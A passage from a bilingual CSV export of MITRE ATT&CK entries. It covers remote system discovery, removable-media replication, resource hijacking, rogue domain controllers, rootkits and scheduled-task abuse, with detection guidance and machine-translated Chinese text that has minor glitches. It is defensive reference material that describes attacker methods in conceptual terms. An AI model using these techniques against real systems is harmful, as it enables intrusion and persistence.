命令或任何数量的程序，如 PowerShell。（引用：Jacobsen 2014）WinRM 可用作与 [Windows Management Instrumentation] 远程交互的方法（https://attack.mitre.org/techniques/T1047） .（引用：MSDN WMI）
T1018,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).

Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.

Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  
",https://attack.mitre.org/techniques/T1018,31 May 2017,06 September 2022,3.4,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Monitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)","Linux, Network, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Process: Process Creation",False,,,"Austin Clark, @c2defense; Daniel Stepanic, Elastic; RedHuntLabs, @redhuntlabs",,,,CAPEC-292,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Cyberreason Anchor December 2019),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Palo Alto ARP),(Citation: Fidelis njRAT June 2013),(Citation: Talos Cobalt Strike September 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: CME Github September 2018),(Citation: ESET Hermetic Wizard March 2022),(Citation: RATANKBA),(Citation: AlienVault Sykipot 2011),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Talos Olympic Destroyer 2018),(Citation: FireEye Clandestine Fox),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT10 April 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: FireEye FIN6 April 2016),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Crowdstrike Qakbot October 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: ESET Industroyer),(Citation: FireEye Periscope March 2018),(Citation: SecureWorks WannaCry Analysis),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Kaspersky APT Trends Q1 2020),(Citation: TechNet Ping),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Aqua Kinsing April 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec Chafer February 2018),(Citation: US-CERT TA18-074A),(Citation: GovCERT Carbon May 2016),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: TechNet Arp),(Citation: FireEye FIN6 Apr 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: DFIR Ryuk's Return October 2020),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Talos Rocke August 2018),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: Kaspersky Turla),(Citation: Symantec Buckeye),(Citation: BitDefender Chafer May 2020),(Citation: ESET ComRAT May 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Nltest Manual),(Citation: Group IB Silence Sept 2018),(Citation: ESET Telebots Dec 2016),(Citation: NTT Security Flagpro new December 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Fortinet Diavol July 2021),(Citation: Symantec Leafminer July 2018),(Citation: Symantec Orangeworm April 2018),(Citation: Roadtools),(Citation: Talos PoetRAT April 2020),(Citation: Alperovitch 2014),(Citation: Debian nbtscan Nov 2019),(Citation: SecTools nbtscan June 2003),(Citation: Savill 1999),(Citation: FireEye APT39 Jan 2019),(Citation: Cybereason Bumblebee August 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye Shamoon Nov 2016),(Citation: Bitdefender FIN8 July 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: cobaltstrike manual),(Citation: ClearSky Lazarus Aug 2020),(Citation: ASERT Donot March 2018),(Citation: Bitdefender Naikon April 2021),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: CrowdStrike BloodHound April 2018),",远程系统发现,攻击者可能会尝试通过 IP 地址、主机名或网络上的其他逻辑标识符获取其他系统的列表，该列表可用于从当前系统进行横向移动。远程访问工具中可能存在启用此功能的功能，但也可以使用操作系统上可用的实用程序，例如 [Ping](https://attack.mitre.org/software/S0097) 或 <code>net view</代码> 使用 [Net](https://attack.mitre.org/software/S0039)。攻击者还可能分析来自本地主机文件（例如：<code>C:\Windows\System32\Drivers\etc\hosts</code> 或 <code>/etc/hosts</code>）或其他被动方式（如作为本地 [Arp](https://attack.mitre.org/software/S0099) 缓存条目），以发现环境中远程系统的存在。攻击者还可能以发现网络基础设施为目标，并利用网络设备上的 [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) 命令收集有关网络内系统的详细信息（例如 <代码>显示 cdp 邻居</code>，<code>show arp</code>）。（引用：US-CERT-TA18-106A）（引用：CISA AR21-126A FIVEHANDS 2021 年 5 月）
T1091,Replication Through Removable Media,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.

Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",https://attack.mitre.org/techniques/T1091,31 May 2017,21 October 2022,1.2,"Initial Access, Lateral Movement","Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.",Windows,"Drive: Drive Creation, File: File Access, File: File Creation, Process: Process Creation",False,,,"Joas Antonio dos Santos, @Cr4zyC0d3",,,"Removable media allowed, Autorun enabled or vulnerability present that allows for code execution",,,,"(Citation: DustySky),(Citation: Fidelis njRAT June 2013),(Citation: FireEye APT30),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: FBI Flash FIN7 USB),(Citation: Microsoft SIR Vol 19),(Citation: ThreatExpert Agent.btz),(Citation: FireEye APT28),(Citation: Kaspersky Darkhotel),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Trend Micro Qakbot May 2020),(Citation: Trend Micro njRAT 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Kaspersky Flame),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: Avira Mustang Panda January 2020),(Citation: SANS Conficker),(Citation: Cisco H1N1 Part 2),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Trend Micro Conficker),(Citation: Forcepoint Monsoon),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Eset Ramsay May 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun),(Citation: win10_asr)",通过可移动介质进行复制,通过将恶意软件复制到可移动媒体并在媒体插入系统并执行时利用自动运行功能，攻击者可能会进入系统，可能是那些在断开或气隙网络上的系统。在横向移动的情况下，这可能通过修改存储在可移动媒体上的可执行文件或通过复制恶意软件并将其重命名为看起来像合法文件以诱骗用户在单独的系统上执行它来发生。在初始访问的情况下，这可能通过手动操作媒体、修改用于初始格式化媒体的系统或修改媒体固件本身来实现。如果通过 USB 连接，移动设备也可能被用于感染带有恶意软件的 PC。（引文：利用智能手机 USB）这种感染可以通过使用设备（Android、iOS 等）以及在某些情况下使用 USB 充电电缆来实现。（引文: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) 例如，当智能手机连接到系统时，它的安装可能类似于 USB 连接的磁盘驱动器。如果与连接系统兼容的恶意软件位于移动设备上，则该恶意软件可能会感染机器（尤其是在启用自动运行功能的情况下）。
T1496,Resource Hijacking,"Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems, which may impact system and/or hosted service availability. 

One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)

Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto Miners)

Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR)",https://attack.mitre.org/techniques/T1496,17 April 2019,18 April 2022,1.3,Impact,"Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.","Containers, IaaS, Linux, Windows, macOS","Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation, Sensor Health: Host Status",False,,,"Alfredo Oliveira, Trend Micro; David Fiser, @anu4is, Trend Micro; Jay Chen, Palo Alto Networks; Magno Logan, @magnologan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,,,,Availability,,"(Citation: Talos Rocke August 2018),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: Lacework TeamTNT May 2021),(Citation: Aqua Kinsing April 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit 42 Rocke January 2019),(Citation: Imminent Unit42 Dec2019),(Citation: ESET ForSSHe December 2018),(Citation: ESET LoudMiner June 2019),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Sysdig Kinsing November 2020),(Citation: FireEye APT41 Aug 2019),(Citation: Cisco Talos Intelligence Group),(Citation: RedCanary Mockingbird May 2020),(Citation: Trend Micro Skidmap),(Citation: Unit 42 Hildegard Malware),",资源劫持,攻击者可能会利用增选系统的资源来解决资源密集型问题，这可能会影响系统和/或托管服务的可用性。资源劫持的一个常见目的是验证加密货币网络的交易并赚取虚拟货币。攻击者可能会消耗足够的系统资源来负面影响和/或导致受影响的机器变得无响应。（引用：Kaspersky Lazarus Under The Hood Blog 2017）服务器和基于云的系统是常见的目标，因为可用资源的潜力很大，但用户终端系统也可能被破坏并用于资源劫持和加密货币挖掘。（引用：CloudSploit - 未使用的 AWS 区域）容器化环境也可能成为目标，因为通过暴露的 API 易于部署以及通过部署或破坏来扩展挖掘活动的潜力环境或集群中的多个容器。（引用：Unit 42 Hildegard Malware）（引用：Trend Micro Exposed Docker APIs）此外，一些加密货币挖掘恶意软件识别然后杀死竞争恶意软件的进程，以确保它不会竞争资源。（引用： Trend Micro War of Crypto Miners）攻击者也可能使用利用系统网络的恶意软件k 带宽作为僵尸网络的一部分，以促进 [网络拒绝服务](https://attack.mitre.org/techniques/T1498) 活动和/或播种恶意种子。（引用：GoBotKR）
T1207,Rogue Domain Controller,"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",https://attack.mitre.org/techniques/T1207,18 April 2018,08 March 2022,2.1,Defense Evasion,"Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)

Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)

Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)

Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.",Windows,"Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Network Traffic: Network Traffic Content, User Account: User Account Authentication",False,,Log analysis,Vincent Le Toux,Administrator,,,,,,"(Citation: Adsecurity Mimikatz Guide),(Citation: Deply Mimikatz),",恶意域控制器,攻击者可能会注册一个恶意域控制器以启用对 Active Directory 数据的操作。 DCShadow 可用于创建恶意域控制器 (DC)。 DCShadow 是一种通过注册（或重用非活动注册）和模拟 DC 的行为来操作 Active Directory (AD) 数据（包括对象和架构）的方法。 （引用：DCShadow 博客）一旦注册，流氓 DC 可能能够将更改注入和复制到任何域对象的 AD 基础架构中，包括凭据和密钥。注册恶意 DC 涉及在 AD 架构的配置分区中创建新服务器和 nTDSDSA 对象，这需要管理员权限（域或 DC 本地）或 KRBTGT 哈希。 （引用：Adsecurity Mimikatz 指南）该技术可能会绕过系统日志记录和安全监视器，例如安全信息和事件管理 (SIEM) 产品（因为在流氓 DC 上采取的操作可能不会报告给这些传感器）。 （引用：DCShadow 博客）该技术还可用于更改和删除复制和其他相关元数据以阻碍取证分析。攻击者也可以利用此技术执行 [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) 和/或操纵 AD 对象（例如帐户、访问控制列表、模式）以建立持久性的后门。 （引用：DCShadow 博客）
T1014,Rootkit,"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) 

Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",https://attack.mitre.org/techniques/T1014,31 May 2017,05 May 2022,1.1,Defense Evasion,"Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)","Linux, Windows, macOS","Drive: Drive Modification, File: File Modification, Firmware: Firmware Modification",False,,"Anti-virus, Application Control, File Monitoring, Host Intrusion Prevention Systems, Signature-based Detection, System Access Controls",,,,,CAPEC-552,,,"(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Intezer HiddenWasp Map 2019),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Trend Micro TeamTNT),(Citation: FireEye Hikit Rootkit),(Citation: Check Point Warzone Feb 2020),(Citation: Symantec APT28 Oct 2018),(Citation: ESET Sednit Part 3),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Kaspersky Turla),(Citation: FireEye APT41 Aug 2019),(Citation: TrendMicro Hacking Team UEFI),(Citation: Umbreon Trend Micro),(Citation: Unit 42 Hildegard Malware),(Citation: Anomali Rocke March 2019),(Citation: NSA/FBI Drovorub August 2020),(Citation: ESET Ebury Oct 2017),(Citation: Trend Micro Skidmap),(Citation: Prevx Carberp March 2011),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Sophos ZeroAccess),(Citation: Symantec Darkmoon Aug 2005),(Citation: ESET LoJax Sept 2018),(Citation: NCSC Joint Report Public Tools),(Citation: Cisco Talos Intelligence Group),(Citation: Eset Ramsay May 2020),(Citation: Kaspersky Winnti April 2013),",Rootkit,攻击者可能会使用 rootkit 来隐藏程序、文件、网络连接、服务、驱动程序和其他系统组件的存在。 Rootkit 是通过拦截/挂钩和修改提供系统信息的操作系统 API 调用来隐藏恶意软件存在的程序。 （引用：赛门铁克 Windows Rootkits）Rootkit 或 Rootkit 启用功能可能驻留在操作系统或更低版本的用户或内核级别，包括管理程序、主引导记录或 [系统固件](https://attack.mitre.组织/技术/T1542/001）。 （引用：Wikipedia Rootkit） Rootkit 已用于 Windows、Linux 和 Mac OS X 系统。 （引用：CrowdStrike Linux Rootkit）（引用：BlackHat Mac OSX Rootkit）
T1053,Scheduled Task/Job,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)

Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",https://attack.mitre.org/techniques/T1053,31 May 2017,14 April 2022,2.2,"Execution, Persistence, Privilege Escalation","Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. 

Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","Containers, Linux, Windows, macOS","Command: Command Execution, Container: Container Creation, File: File Creation, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation",False,,,"Alain Homewood, Insomnia Security; Andrew Northern, @ex_raritas; Bryan Campbell, @bry_campbell; Leo Loobeek, @leoloobeek; Prashant Verma, Paladion; Selena Larson, @selenalarson; Travis Smith, Tripwire; Zachary Abzug, @ZackDoesML","Administrator, SYSTEM, User",1.0,,CAPEC-557,,"Administrator, SYSTEM, User","(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talos Lokibot Jan 2021),(Citation: Cybereason StrifeWater Feb 2022),(Citation: TechNet Scheduling Priority),(Citation: Powersploit),(Citation: TechNet Server Operator Scheduled Task)",计划任务/作业,攻击者可能会滥用任务调度功能来促进恶意代码的初始或重复执行。所有主要操作系统中都有实用程序来安排程序或脚本在指定的日期和时间执行。如果满足适当的身份验证（例如：RPC 以及 Windows 环境中的文件和打印机共享），也可以在远程系统上安排任务。在远程系统上调度任务通常可能需要成为远程系统上的管理员或其他特权组的成员。（引用：TechNet 任务调度程序安全）攻击者可以使用任务调度在系统启动时或按计划执行程序坚持。这些机制也可以被滥用以在指定帐户（例如具有提升的权限/特权的帐户）的上下文下运行进程。与 [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) 类似，攻击者也滥用任务调度来潜在地掩盖可信系统进程下的一次性执行。（引用：ProofPoint Serpent）
T1053.002,Scheduled Task/Job: At,"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.

On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)

Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).

In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",https://attack.mitre.org/techniques/T1053/002,27 November 2019,18 April 2022,2.0,"Execution, Persistence, Privilege Escalation","Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\System32\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.

Configure event logging for scheduled task creation and changes by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)

Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.

In Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. 

Review all jobs using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables, machines that created the jobs, are trusted hosts. All [at](https://attack.mitre.org/software/S0110) jobs are stored in <code>/var/spool/cron/atjobs/</code>.(Citation: rowland linux at 2019)

Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [Command and Control](https://attack.mitre.org/tactics/TA0011), learning details about the environment through [Discovery](https://attack.mitre.org/tactics/TA0007), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008).","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,,"Administrator, User",1.0,,,,,"(Citation: Dell Lateral Movement),(Citation: Dell TG-3390),(Citation: TechNet At),(Citation: Linux at),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye Periscope March 2018),(Citation: CME Github September 2018),(Citation: Secureworks - AT.exe Scheduled Task),(Citation: Powersploit),(Citation: Kifarunix - Task Scheduling in Linux),(Citation: TechNet Scheduling Priority),(Citation: TechNet Server Operator Scheduled Task)",计划任务/作业：At,攻击者可能会滥用 [at](https://attack.mitre.org/software/S0110) 实用程序来执行任务调度以执行恶意代码的初始或重复执行。 [at](https://attack.mitre.org/software/S0110) 实用程序作为 Windows、Linux 和 macOS 中的可执行文件存在，用于在指定时间和日期安排任务。尽管在 Windows 环境中已弃用 [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) 的 [schtasks](https://attack.mitre.org/software/S0111)，使用 [at](https://attack.mitre.org/software/S0110) 要求任务计划程序服务正在运行，并且用户以本地管理员组的成员身份登录。在 Linux 和 macOS 上，超级用户以及添加到 <code>at.allow</code> 文件的任何用户都可以调用 [at](https://attack.mitre.org/software/S0110)。如果 <code>at.allow</code> 文件不存在，则检查 <code>at.deny</code> 文件。 <code>at.deny</code> 中未列出的每个用户名都可以调用 [at](https://attack.mitre.org/software/S0110)。如果 <code>at.deny</code> 存在且为空，则允许全局使用 [at](https://attack.mitre.org/software/S0110)。如果两个文件都不存在（通常是基线），则只允许超级用户使用 [at](https://attack.mitre.org/software/S0110)。（引用：Linux at）攻击者可以使用 [at]( https://attack.mitre.org/software/S0110）在系统启动时或按计划执行程序以实现 [Persistence]（https://attack.mitre.org/tactics/TA0003）。 [at](https://attack.mitre.org/software/S0110) 也可以被滥用来进行远程 [Execution](https://attack.mitre.org/tactics/TA0002) 作为 [横向移动] 的一部分（https://attack.mitre.org/tactics/TA0008）和/或在指定帐户（例如SYSTEM）的上下文下运行进程。在 Linux 环境中，攻击者还可能滥用 [at](https://attack.mitre.org/software/S0110) 通过使用任务生成交互式系统 shell 或运行系统命令来突破受限环境。同样，[at](https://attack.mitre.org/software/S0110) 也可用于 [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) 如果允许二进制文件通过 <code>sudo</code> 以超级用户身份运行。（引用：GTFObins at）
T1053.007,Scheduled Task/Job: Container Orchestration Job,"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.

In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",https://attack.mitre.org/techniques/T1053/007,29 March 2021,01 April 2022,1.2,"Execution, Persistence, Privilege Escalation",Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments. ,Containers,"Container: Container Creation, File: File Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",User,1.0,,,,,",(Citation: Kubernetes Hardening Guide)",计划任务/作业：容器编排作业,攻击者可能会滥用容器编排工具（如 